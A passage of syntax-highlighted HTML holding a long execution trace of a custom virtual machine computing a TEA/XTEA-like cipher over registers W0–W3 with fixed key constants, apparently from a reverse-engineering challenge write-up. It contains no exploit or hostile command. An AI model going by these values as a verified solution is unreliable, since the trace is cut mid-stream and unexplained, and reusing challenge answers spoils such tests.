<span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7f</span>8d1427 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span>cae4141\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5</span>cae4141 <span class=\"token operator\">^</span> <span class=\"token number\">4</span>b65e055 <span class=\"token operator\">=</span> <span class=\"token number\">17</span>cba114\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17</span>cba114 <span class=\"token operator\">+</span> bfb69071 <span class=\"token operator\">=</span> d7823185\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d7823185 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>bc118c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d7823185 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">35e08</span>c6140\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">6</span>bc118c <span class=\"token operator\">^</span> e08c6140 <span class=\"token operator\">=</span> e63070cc\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d7823185 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> c6a002c1\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e63070cc <span class=\"token operator\">+</span> c6a002c1 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>acd0738d\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">=</span> <span class=\"token number\">838</span>b1622\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">838</span>b1622 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">28200430</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> acd0738d <span class=\"token operator\">^</span> <span class=\"token number\">28200430</span> <span class=\"token operator\">=</span> <span class=\"token number\">84f</span>077bd\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">84f</span>077bd <span class=\"token operator\">+</span> f92118c1 <span class=\"token operator\">=</span> <span class=\"token number\">17e11907</span>e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">7e11907</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">3f</span>08c83f00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span> <span class=\"token operator\">^</span> <span class=\"token number\">8</span>c83f00 <span class=\"token operator\">=</span> f292607\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>b77e7f6\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f292607 <span class=\"token operator\">+</span> <span class=\"token number\">2</span>b77e7f6 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>aa10dfd\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> faff3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> faff3 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">74696564</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">=</span> f1e90100\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f1e90100 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> d2ca5466\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d2ca5466 <span class=\"token operator\">^</span> <span class=\"token number\">3</span>aa10dfd <span class=\"token operator\">=</span> e86b599b\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e86b599b <span class=\"token operator\">+</span> d7823185 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>bfed8b20\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfed8b20 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">5ff</span>6c59\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfed8b20 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">2ff</span>b62c800\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5ff</span>6c59 <span class=\"token operator\">^</span> fb62c800 <span class=\"token operator\">=</span> fe9da459\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfed8b20 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> aecfb864\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> fe9da459 <span class=\"token operator\">+</span> aecfb864 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>ad6d5cbd\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> <span class=\"token number\">7</span>d7f9b9c <span class=\"token operator\">=</span> f4ef03ef\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f4ef03ef <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">5f</span>4411fd\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> ad6d5cbd <span class=\"token operator\">^</span> <span class=\"token number\">5f</span>4411fd <span class=\"token operator\">=</span> f2294d40\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f2294d40 <span class=\"token operator\">+</span> <span class=\"token number\">7e11907</span>e <span class=\"token operator\">=</span> <span class=\"token number\">1703</span>addbe\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">703</span>addb\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">381</span>d6edf00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addb <span class=\"token operator\">^</span> <span class=\"token number\">1</span>d6edf00 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>a6d72db\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">255</span>caa36\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1</span>a6d72db <span class=\"token operator\">+</span> <span class=\"token number\">255</span>caa36 <span class=\"token operator\">=</span> <span class=\"token number\">3f</span>ca1d11\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dcdf8283 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">1</span>b9bf0\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1</span>b9bf0 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> dcdf8283 <span class=\"token operator\">=</span> <span class=\"token number\">1544</span>eead6\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">544</span>eead6 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">776</span>dbfb0\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776</span>dbfb0 <span class=\"token operator\">^</span> <span class=\"token number\">3f</span>ca1d11 <span class=\"token operator\">=</span> <span class=\"token number\">48</span>a7a2a1\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">48</span>a7a2a1 <span class=\"token operator\">+</span> bfed8b20 <span class=\"token operator\">=</span> <span class=\"token number\">108952</span>dc1\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">44</span>a96e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">2254</span>b7040\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">44</span>a96e <span class=\"token operator\">^</span> <span class=\"token number\">254</span>b7040 <span class=\"token operator\">=</span> <span class=\"token number\">250f</span>d92e\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">19</span>b71e85\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">250f</span>d92e <span class=\"token operator\">+</span> <span class=\"token number\">19</span>b71e85 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>ec6f7b3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dcdf8283 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">74696564</span> <span class=\"token operator\">+</span> dcdf8283 <span class=\"token operator\">=</span> <span class=\"token number\">15148e7</span>e7\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5148e7</span>e7 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> fae3f5f5\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>ec6f7b3 <span class=\"token operator\">^</span> fae3f5f5 <span class=\"token operator\">=</span> c4250246\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> c4250246 <span class=\"token operator\">+</span> <span class=\"token number\">703</span>addbe <span class=\"token operator\">=</span> <span class=\"token number\">1345f</span>e004\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">345f</span>e00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>a2ff00200\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e00 <span class=\"token operator\">^</span> <span class=\"token number\">2ff</span>00200 <span class=\"token operator\">=</span> <span class=\"token number\">2</span>cb5fc00\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">6139978</span>c\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">2</span>cb5fc00 <span class=\"token operator\">+</span> <span class=\"token number\">6139978</span>c <span class=\"token operator\">=</span> <span class=\"token number\">8</span>def938c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">787</span>ed\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">787</span>ed <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">=</span> a1aacad7\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> a1aacad7 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">82899f</span>b1\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">82899f</span>b1 <span class=\"token operator\">^</span> <span class=\"token number\">8</span>def938c <span class=\"token operator\">=</span> f660c3d\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f660c3d <span class=\"token operator\">+</span> <span class=\"token number\">8952</span>dc1 <span class=\"token operator\">=</span> <span class=\"token number\">17f</span>b39fe\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> bfd9cf\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">5f</span>ece7f80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfd9cf <span class=\"token operator\">^</span> fece7f80 <span class=\"token operator\">=</span> fe71a64f\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>d90aba\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> fe71a64f <span class=\"token operator\">+</span> <span class=\"token number\">6</span>d90aba <span class=\"token operator\">=</span> <span class=\"token number\">1054</span>ab109\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> <span class=\"token number\">3</span>c3f696a <span class=\"token operator\">=</span> <span class=\"token number\">9</span>dacc8dc\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9</span>dacc8dc <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">3607</span>dace\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">54</span>ab109 <span class=\"token operator\">^</span> <span class=\"token number\">3607</span>dace <span class=\"token operator\">=</span> <span class=\"token number\">334</span>d6bc7\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">334</span>d6bc7 <span class=\"token operator\">+</span> <span class=\"token number\">345f</span>e004 <span class=\"token operator\">=</span> <span class=\"token number\">67</span>ad4bcb\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">67</span>ad4bc\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">33</span>d6a5e580\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bc <span class=\"token operator\">^</span> d6a5e580 <span class=\"token operator\">=</span> d0df313c\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span>cb3c43\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d0df313c <span class=\"token operator\">+</span> <span class=\"token number\">32</span>cb3c43 <span class=\"token operator\">=</span> <span class=\"token number\">103</span>aa6d7f\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">1373</span>ea\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1373</span>ea <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">=</span> fd0cafc3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> fd0cafc3 <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> de2ffaa5\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> de2ffaa5 <span class=\"token operator\">^</span> <span class=\"token number\">3</span>aa6d7f <span class=\"token operator\">=</span> dd8597da\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dd8597da <span class=\"token operator\">+</span> <span class=\"token number\">17f</span>b39fe <span class=\"token operator\">=</span> f580d1d8\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f580d1d8 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span>ac068e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f580d1d8 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>d60347600\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7</span>ac068e <span class=\"token operator\">^</span> <span class=\"token number\">60347600</span> <span class=\"token operator\">=</span> <span class=\"token number\">6798708</span>e\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f580d1d8 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> e4a2e29c\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">6798708</span>e <span class=\"token operator\">+</span> e4a2e29c <span class=\"token operator\">=</span> <span class=\"token number\">14</span>c3b532a\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> <span class=\"token number\">9</span>b9f5051 <span class=\"token operator\">=</span> <span class=\"token number\">1010</span>ab1be\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">10</span>ab1be <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> aaa1a3ac\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span>c3b532a <span class=\"token operator\">^</span> aaa1a3ac <span class=\"token operator\">=</span> e69af086\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e69af086 <span class=\"token operator\">+</span> <span class=\"token number\">67</span>ad4bcb <span class=\"token operator\">=</span> <span class=\"token number\">14e483</span>c51\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c51 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">4e483</span>c5\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c51 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">27241e2880</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c5 <span class=\"token operator\">^</span> <span class=\"token number\">241e2880</span> <span class=\"token operator\">=</span> <span class=\"token number\">20f</span>aab45\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4e483</span>c51 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>b2e4bd9\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">20f</span>aab45 <span class=\"token operator\">+</span> <span class=\"token number\">1</span>b2e4bd9 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>c28f71e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> faff3738 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">1f</span>5fe6\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token 